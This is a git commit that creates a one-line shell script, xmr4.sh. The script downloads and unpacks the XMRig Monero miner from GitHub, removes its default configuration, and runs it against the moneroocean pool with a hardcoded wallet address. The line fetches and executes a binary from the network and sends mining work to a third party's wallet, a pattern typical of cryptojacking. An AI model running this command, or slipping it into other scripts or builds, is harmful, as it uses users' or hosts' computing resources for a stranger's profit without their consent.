03b27f059796995ea1821eb64bb16aaa4a9ec3b4
shaiban09 <112415268+shaiban09@users.noreply.github.com>
2022-10-03 03:38:12 +0300

    Create xmr4.sh

---
+++ xmr4.sh
@@ -0,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz && tar xvzf xmrig-6.15.0-linux-static-x64.tar.gz && cd xmrig-6.15.0 && rm config.json && ./xmrig -o gulf.moneroocean.stream:10128 -u 47rRaVrE8xhenVsK2oF5spDgR7A6CJiKT6SHrNmuq8UGJUp3fRegVpS583QQPTsRWWL7L87FSKKaf5qHrpfDPPpM6CzmhGY -p ssz4
